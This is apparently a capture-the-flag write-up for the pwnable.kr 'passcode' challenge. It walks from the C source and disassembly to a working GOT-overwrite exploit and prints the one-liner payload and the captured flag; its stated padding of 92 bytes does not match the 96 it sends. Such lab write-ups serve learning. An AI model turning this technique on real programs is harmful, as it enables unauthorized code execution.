# Passcode

Mommy told me to make a passcode based login system.
My first trial C implementation compiled without any error!
Well, there were some compiler warnings, but who cares about that?

ssh passcode@pwnable.kr -p2222 (pw:guest)

- first let's check the contents of the directory

```bash
passcode@ubuntu:~$ ls -ls
total 24
 4 -r--r----- 1 root passcode_pwn    42 Apr 19 10:48 flag
16 -r-xr-sr-x 1 root passcode_pwn 15232 Apr 19 10:54 passcode
 4 -rw-r--r-- 1 root root           892 Apr 19 10:54 passcode.c
passcode@ubuntu:~$ 
```
- as usual, let's check the code in the C file
```c
#include <stdio.h>
#include <stdlib.h>

void login(){
        int passcode1;
        int passcode2;

        printf("enter passcode1 : ");
        scanf("%d", passcode1);
        fflush(stdin);

        // ha! mommy told me that 32bit is vulnerable to bruteforcing :)
        printf("enter passcode2 : ");
        scanf("%d", passcode2);

        printf("checking...\n");
        if(passcode1==123456 && passcode2==13371337){
                printf("Login OK!\n");
                setregid(getegid(), getegid());
                system("/bin/cat flag");
        }
        else{
                printf("Login Failed!\n");
                exit(0);
        }
}

void welcome(){
        char name[100];
        printf("enter you name : ");
        scanf("%100s", name);
        printf("Welcome %s!\n", name);
}

int main(){
        printf("Toddler's Secure Login System 1.1 beta.\n");

        welcome();
        login();

        // something after login...
        printf("Now I can safely trust you that you have credential :)\n");
        return 0;
}
```
- let's see how it runs
```bash
passcode@ubuntu:~$ ./passcode
Toddler's Secure Login System 1.1 beta.
enter you name : Vince
Welcome Vince!
enter passcode1 : 123456
enter passcode2 : 13371337
Segmentation fault (core dumped)
passcode@ubuntu:~$ 
```
- hmm, that's expected
- my first suspicion was the fflush since flushing stdin is considered an unsafe practice
- but then the scanf calls caught my eye
```c
scanf("%d", passcode1);
```
```c
scanf("%d", passcode2);
```
- in each of the function calls passcode1 and passcode2 are being passed instead of &password1 and &password 2
    - this means that scanf is writing the value we pass to it to the address formed by the garbage data in the variables (since password1 and password2 are uninitialized) rather than the address of the variables
    - for example, if password1 = 0x41414141, scanf will attempt to write our input at the address 0x41414141
- there is one more scanf function call in the program:
```c
scanf("%100s", name);
```
- in the welcome function
     - it only allows for 100 chars (bytes)
- still a little lost here so lets look for these scanf calls and which registers it saves the inputs to
```bash
pwndbg> disass welcome
Dump of assembler code for function welcome:
   0x080492f2 <+0>:     push   ebp
   0x080492f3 <+1>:     mov    ebp,esp
   0x080492f5 <+3>:     push   ebx
   0x080492f6 <+4>:     sub    esp,0x74
   0x080492f9 <+7>:     call   0x8049130 <__x86.get_pc_thunk.bx>
   0x080492fe <+12>:    add    ebx,0x2d02
   0x08049304 <+18>:    mov    eax,gs:0x14
   0x0804930a <+24>:    mov    DWORD PTR [ebp-0xc],eax
   0x0804930d <+27>:    xor    eax,eax
   0x0804930f <+29>:    sub    esp,0xc
   0x08049312 <+32>:    lea    eax,[ebx-0x1f9d]
   0x08049318 <+38>:    push   eax
   0x08049319 <+39>:    call   0x8049050 <printf@plt>
   0x0804931e <+44>:    add    esp,0x10
   0x08049321 <+47>:    sub    esp,0x8
   0x08049324 <+50>:    lea    eax,[ebp-0x70]
   0x08049327 <+53>:    push   eax
   0x08049328 <+54>:    lea    eax,[ebx-0x1f8b]
   0x0804932e <+60>:    push   eax
   0x0804932f <+61>:    call   0x80490d0 <__isoc99_scanf@plt>
   0x08049334 <+66>:    add    esp,0x10
   0x08049337 <+69>:    sub    esp,0x8
   0x0804933a <+72>:    lea    eax,[ebp-0x70]
   0x0804933d <+75>:    push   eax
   0x0804933e <+76>:    lea    eax,[ebx-0x1f85]
   0x08049344 <+82>:    push   eax
   0x08049345 <+83>:    call   0x8049050 <printf@plt>
   0x0804934a <+88>:    add    esp,0x10
   0x0804934d <+91>:    nop
   0x0804934e <+92>:    mov    eax,DWORD PTR [ebp-0xc]
   0x08049351 <+95>:    sub    eax,DWORD PTR gs:0x14
   0x08049358 <+102>:   je     0x804935f <welcome+109>
   0x0804935a <+104>:   call   0x80493c0 <__stack_chk_fail_local>
   0x0804935f <+109>:   mov    ebx,DWORD PTR [ebp-0x4]
   0x08049362 <+112>:   leave  
   0x08049363 <+113>:   ret    
End of assembler dump.
pwndbg> 
```
```bash
pwndbg> disass login
Dump of assembler code for function login:
   0x080491f6 <+0>:     push   ebp
   0x080491f7 <+1>:     mov    ebp,esp
   0x080491f9 <+3>:     push   esi
   0x080491fa <+4>:     push   ebx
   0x080491fb <+5>:     sub    esp,0x10
   0x080491fe <+8>:     call   0x8049130 <__x86.get_pc_thunk.bx>
   0x08049203 <+13>:    add    ebx,0x2dfd
   0x08049209 <+19>:    sub    esp,0xc
   0x0804920c <+22>:    lea    eax,[ebx-0x1ff8]
   0x08049212 <+28>:    push   eax
   0x08049213 <+29>:    call   0x8049050 <printf@plt>
   0x08049218 <+34>:    add    esp,0x10
   0x0804921b <+37>:    sub    esp,0x8
   0x0804921e <+40>:    push   DWORD PTR [ebp-0x10]
   0x08049221 <+43>:    lea    eax,[ebx-0x1fe5]
   0x08049227 <+49>:    push   eax
   0x08049228 <+50>:    call   0x80490d0 <__isoc99_scanf@plt>
   0x0804922d <+55>:    add    esp,0x10
   0x08049230 <+58>:    mov    eax,DWORD PTR [ebx-0x4]
   0x08049236 <+64>:    mov    eax,DWORD PTR [eax]
   0x08049238 <+66>:    sub    esp,0xc
   0x0804923b <+69>:    push   eax
   0x0804923c <+70>:    call   0x8049060 <fflush@plt>
   0x08049241 <+75>:    add    esp,0x10
   0x08049244 <+78>:    sub    esp,0xc
   0x08049247 <+81>:    lea    eax,[ebx-0x1fe2]
   0x0804924d <+87>:    push   eax
   0x0804924e <+88>:    call   0x8049050 <printf@plt>
   0x08049253 <+93>:    add    esp,0x10
   0x08049256 <+96>:    sub    esp,0x8
   0x08049259 <+99>:    push   DWORD PTR [ebp-0xc]
   0x0804925c <+102>:   lea    eax,[ebx-0x1fe5]
   0x08049262 <+108>:   push   eax
   0x08049263 <+109>:   call   0x80490d0 <__isoc99_scanf@plt>
   0x08049268 <+114>:   add    esp,0x10
   0x0804926b <+117>:   sub    esp,0xc
   0x0804926e <+120>:   lea    eax,[ebx-0x1fcf]
   0x08049274 <+126>:   push   eax
   0x08049275 <+127>:   call   0x8049090 <puts@plt>
   0x0804927a <+132>:   add    esp,0x10
   0x0804927d <+135>:   cmp    DWORD PTR [ebp-0x10],0x1e240
   0x08049284 <+142>:   jne    0x80492ce <login+216>
   0x08049286 <+144>:   cmp    DWORD PTR [ebp-0xc],0xcc07c9
   0x0804928d <+151>:   jne    0x80492ce <login+216>
   0x0804928f <+153>:   sub    esp,0xc
   0x08049292 <+156>:   lea    eax,[ebx-0x1fc3]
   0x08049298 <+162>:   push   eax
   0x08049299 <+163>:   call   0x8049090 <puts@plt>
   0x0804929e <+168>:   add    esp,0x10
   0x080492a1 <+171>:   call   0x8049080 <getegid@plt>
   0x080492a6 <+176>:   mov    esi,eax
   0x080492a8 <+178>:   call   0x8049080 <getegid@plt>
   0x080492ad <+183>:   sub    esp,0x8
   0x080492b0 <+186>:   push   esi
   0x080492b1 <+187>:   push   eax
   0x080492b2 <+188>:   call   0x80490c0 <setregid@plt>
   0x080492b7 <+193>:   add    esp,0x10
   0x080492ba <+196>:   sub    esp,0xc
   0x080492bd <+199>:   lea    eax,[ebx-0x1fb9]
   0x080492c3 <+205>:   push   eax
   0x080492c4 <+206>:   call   0x80490a0 <system@plt>
   0x080492c9 <+211>:   add    esp,0x10
   0x080492cc <+214>:   jmp    0x80492ea <login+244>
   0x080492ce <+216>:   sub    esp,0xc
   0x080492d1 <+219>:   lea    eax,[ebx-0x1fab]
   0x080492d7 <+225>:   push   eax
   0x080492d8 <+226>:   call   0x8049090 <puts@plt>
   0x080492dd <+231>:   add    esp,0x10
   0x080492e0 <+234>:   sub    esp,0xc
   0x080492e3 <+237>:   push   0x0
   0x080492e5 <+239>:   call   0x80490b0 <exit@plt>
   0x080492ea <+244>:   nop
   0x080492eb <+245>:   lea    esp,[ebp-0x8]
   0x080492ee <+248>:   pop    ebx
   0x080492ef <+249>:   pop    esi
   0x080492f0 <+250>:   pop    ebp
   0x080492f1 <+251>:   ret    
End of assembler dump.
pwndbg> 
```
- in welcome, the scanf is called here for name
```bash
   0x0804931e <+44>:    add    esp,0x10
   0x08049321 <+47>:    sub    esp,0x8
   0x08049324 <+50>:    lea    eax,[ebp-0x70]
   0x08049327 <+53>:    push   eax
   0x08049328 <+54>:    lea    eax,[ebx-0x1f8b]
   0x0804932e <+60>:    push   eax
   0x0804932f <+61>:    call   0x80490d0 <__isoc99_scanf@plt>
   0x08049334 <+66>:    add    esp,0x10
   0x08049337 <+69>:    sub    esp,0x8
   0x0804933a <+72>:    lea    eax,[ebp-0x70]
   0x0804933d <+75>:    push   eax
   0x0804933e <+76>:    lea    eax,[ebx-0x1f85]
   0x08049344 <+82>:    push   eax


```
- in login for password1 and password2
```bash
   0x08049218 <+34>:    add    esp,0x10
   0x0804921b <+37>:    sub    esp,0x8
   0x0804921e <+40>:    push   DWORD PTR [ebp-0x10]
   0x08049221 <+43>:    lea    eax,[ebx-0x1fe5]
   0x08049227 <+49>:    push   eax
   0x08049228 <+50>:    call   0x80490d0 <__isoc99_scanf@plt>
   0x0804922d <+55>:    add    esp,0x10
   0x08049230 <+58>:    mov    eax,DWORD PTR [ebx-0x4]
   0x08049236 <+64>:    mov    eax,DWORD PTR [eax]
   0x08049238 <+66>:    sub    esp,0xc
   0x0804923b <+69>:    push   eax

```
```bash
   0x08049253 <+93>:    add    esp,0x10
   0x08049256 <+96>:    sub    esp,0x8
   0x08049259 <+99>:    push   DWORD PTR [ebp-0xc]
   0x0804925c <+102>:   lea    eax,[ebx-0x1fe5]
   0x08049262 <+108>:   push   eax
   0x08049263 <+109>:   call   0x80490d0 <__isoc99_scanf@plt>
   0x08049268 <+114>:   add    esp,0x10
   0x0804926b <+117>:   sub    esp,0xc
   0x0804926e <+120>:   lea    eax,[ebx-0x1fcf]
   0x08049274 <+126>:   push   eax
```
- lets check the registers when it runs to see where data is stored
```bash
pwndbg> b *welcome+50
Breakpoint 1 at 0x8049324
pwndbg> b *welcome+72
Breakpoint 2 at 0x804932f
pwndbg> b *login+40
Breakpoint 3 at 0x804921e
pwndbg> b *login+50
Breakpoint 4 at 0x8049228
pwndbg> b *login+99
Breakpoint 5 at 0x8049259
pwndbg> b *login+109
Breakpoint 6 at 0x8049263
pwndbg> r
```

```bash
enter you name : AAAAAAAA 

LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA
───────────────────[ REGISTERS / show-flags off / show-compact-regs off ]────────────────────
*EAX  1
 EBX  0x804c000 (_GLOBAL_OFFSET_TABLE_) —▸ 0x804bf10 (_DYNAMIC) ◂— 1
*ECX  0xf7e33380 (_nl_C_LC_CTYPE_class+256) ◂— 0x20002
 EDX  0
 EDI  0xf7f0eb80 (_rtld_global_ro) ◂— 0
 ESI  0xfff6a9e4 —▸ 0xfff6ad61 ◂— '/home/passcode/passcode'
 EBP  0xfff6a908 —▸ 0xfff6a918 —▸ 0xf7f0f020 (_rtld_global) —▸ 0xf7f0fa40 ◂— 0
*ESP  0xfff6a888 —▸ 0xf7eb9da0 (_IO_2_1_stdout_) ◂— 0xfbad2a84
*EIP  0x804933a (welcome+72) ◂— lea eax, [ebp - 0x70]
─────────────────────────────[ DISASM / i386 / set emulate off ]─────────────────────────────
   0x8049328 <welcome+54>    lea    eax, [ebx - 0x1f8b]
   0x804932e <welcome+60>    push   eax
   0x804932f <welcome+61>    call   __isoc99_scanf@plt          <__isoc99_scanf@plt>
 
   0x8049334 <welcome+66>    add    esp, 0x10
   0x8049337 <welcome+69>    sub    esp, 8
 ► 0x804933a <welcome+72>    lea    eax, [ebp - 0x70]       EAX => 0xfff6a898 ◂— 'AAAAAAAA'
   0x804933d <welcome+75>    push   eax
   0x804933e <welcome+76>    lea    eax, [ebx - 0x1f85]
   0x8049344 <welcome+82>    push   eax
   0x8049345 <welcome+83>    call   printf@plt                  <printf@plt>
 
   0x804934a <welcome+88>    add    esp, 0x10
──────────────────────────────────────────[ STACK ]──────────────────────────────────────────
00:0000│ esp 0xfff6a888 —▸ 0xf7eb9da0 (_IO_2_1_stdout_) ◂— 0xfbad2a84
01:0004│-07c 0xfff6a88c —▸ 0x80492fe (welcome+12) ◂— add ebx, 0x2d02
02:0008│-078 0xfff6a890 —▸ 0xf7eb9da0 (_IO_2_1_stdout_) ◂— 0xfbad2a84
03:000c│-074 0xfff6a894 —▸ 0x83b71a0 ◂— 'enter you name : Login System 1.1 beta.\n'
04:0010│-070 0xfff6a898 ◂— 'AAAAAAAA'
05:0014│-06c 0xfff6a89c ◂— 'AAAA'
06:0018│-068 0xfff6a8a0 ◂— 0
07:001c│-064 0xfff6a8a4 ◂— 0x28 /* '(' */
────────────────────────────────────────[ BACKTRACE ]────────────────────────────────────────
 ► 0 0x804933a welcome+72
   1 0x8049395 main+49
   2 0xf7cb0519 __libc_start_call_main+121
   3 0xf7cb05f3 __libc_start_main+147
   4 0x804910c _start+44
─────────────────────────────────────────────────────────────────────────────────────────────
pwndbg> x/s $ebp-0x70
0xfff6a898:     "AAAAAAAA"
pwndbg> x/20wx $ebp-0x70
0xfff6a898:     0x41414141      0x41414141      0x00000000      0x00000028
0xfff6a8a8:     0xf7d0e49d      0xf7eb7a60      0xf7eb9da0      0xf7eb9000
0xfff6a8b8:     0xfff6a8f8      0xf7d0242b      0xf7eb9da0      0x0000000a
0xfff6a8c8:     0x00000027      0xfff6aa48      0x00000000      0x000007d4
0xfff6a8d8:     0xf7eb9e3c      0x00000027      0xfff6a918      0xf7eeb004
pwndbg> 
```
- we can confirm that our name is stored at ebp-0x70, which is executed in this line:
```bash
0x08049324 <+50>:    lea    eax,[ebp-0x70]
```
- in login, we have similar lines around the other scanf calls
password1
```bash
0x0804921e <+40>:    push   DWORD PTR [ebp-0x10]
```
and password2
```bash
0x08049259 <+99>:    push   DWORD PTR [ebp-0xc]
```
- name (ebp-0x70) and password1(ebp-0x10) are p close in memory
    - 0x70-0x10 = 0x60 = 96 in decimal
    - passcode1 is within the 100 byte limit of name
    - if we type 96 characters into name, we can use the last 4 bytes to affect the data in passcode1
- we know that passcode1 incorrectly, takes the value of passcode1 as an address
    - currently passcode1 contains garbage data
- However, we found out that we can update the contents of passcode1 when scanf prompts us for a name (name and passcode within 100 bytes of each other on the stack)
- we can exploit this inserting a valid address into passcode1
    - when we enter passcode1, it wont use garbage data as an address, but rather the address we inserted ourselves
    - it will then update that address with the input we give it
    - the input we will give to scanf will be another address on the stack that we want to jump to
    - essentially, we are inserting our own code through the input
- we need to figure out where we want to overwrite
- we can use the GOT table using 'readelf -a passcode'
    - this section seems useful
```bash
Relocation section '.rel.plt' at offset 0x440 contains 10 entries:
 Offset     Info    Type            Sym.Value  Sym. Name
0804c00c  00000107 R_386_JUMP_SLOT   00000000   __libc_start_main@GLIBC_2.34
0804c010  00000207 R_386_JUMP_SLOT   00000000   printf@GLIBC_2.0
0804c014  00000307 R_386_JUMP_SLOT   00000000   fflush@GLIBC_2.0
0804c018  00000407 R_386_JUMP_SLOT   00000000   __stack_chk_fail@GLIBC_2.4
0804c01c  00000507 R_386_JUMP_SLOT   00000000   getegid@GLIBC_2.0
0804c020  00000607 R_386_JUMP_SLOT   00000000   puts@GLIBC_2.0
0804c024  00000707 R_386_JUMP_SLOT   00000000   system@GLIBC_2.0
0804c028  00000907 R_386_JUMP_SLOT   00000000   exit@GLIBC_2.0
0804c02c  00000b07 R_386_JUMP_SLOT   00000000   setregid@GLIBC_2.0
0804c030  00000c07 R_386_JUMP_SLOT   00000000   __isoc99_scanf@GLIBC_2.7
No processor specific unwind information to decode
```
- a lot to choose from, lets try printf
```bash
pwndbg> disass printf
Dump of assembler code for function printf@plt:
   0x08049050 <+0>:     jmp    DWORD PTR ds:0x804c010
   0x08049056 <+6>:     push   0x8
   0x0804905b <+11>:    jmp    0x8049030
End of assembler dump.
pwndbg> 
```
- since printf jumps to the address 0x804c010, lets overwrite there
- now we need to figure out what we want to overwrite it with
    - an idea is where the program calls system(/bin/cat flag)
```bash
0x080492c4 <+206>:   call   0x80490a0 <system@plt>
```
- we need to input this address as an int since thats the datatype scanf is looking for

- 0x080492c4 = 134517444

- so our payload will be "A"*92 + '\x10\xc0\x04\x08' + '134517444'
```bash
passcode@ubuntu:~$ ( printf '%s' "$(printf '\x01%.0s' {1..96})"; printf '\x10\xc0\x04\x08'; printf '134517444' ) | ./passcode
Toddler's Secure Login System 1.1 beta.
enter you name : Welcome !
sh: 1: ����u�����P�h�������
                           ��1���P�������}�@�: not found
enter passcode1 : Now I can safely trust you that you have credential :)
```
- hm, it correctly jumped passed the passcode check but its all garbage data
- let's try an earlier address?
```bash
   0x0804927d <+135>:   cmp    DWORD PTR [ebp-0x10],0x1e240
   0x08049284 <+142>:   jne    0x80492ce <login+216>
   0x08049286 <+144>:   cmp    DWORD PTR [ebp-0xc],0xcc07c9
   0x0804928d <+151>:   jne    0x80492ce <login+216>
   0x0804928f <+153>:   sub    esp,0xc
   0x08049292 <+156>:   lea    eax,[ebx-0x1fc3]
   0x08049298 <+162>:   push   eax
```
```bash
0x0804928f <+153>:   sub    esp,0xc
```
- this line happens right after the passcode check
- 0x0804928f = 134517391
- so our payload will be "A"*92 + '\x10\xc0\x04\x08' + '134517391'
```bash
passcode@ubuntu:~$ ( printf "$(printf '\x01%.0s' {1..96})"; printf '\x10\xc0\x04\x08'; printf '134517391' ) | ./passcode
Toddler's Secure Login System 1.1 beta.
enter you name : Welcome !
enter passcode1 : Login OK!
s0rry_mom_I_just_ign0red_c0mp1ler_w4rning
Now I can safely trust you that you have credential :)
passcode@ubuntu:~$ 
```
- nice, we solved it
- reasoning for jumping to an earlier address:
    - setregid() provides the required group privilege needed to run /bin/cat flag since permissions for that file are restricted
    - basically just need to to run setregid first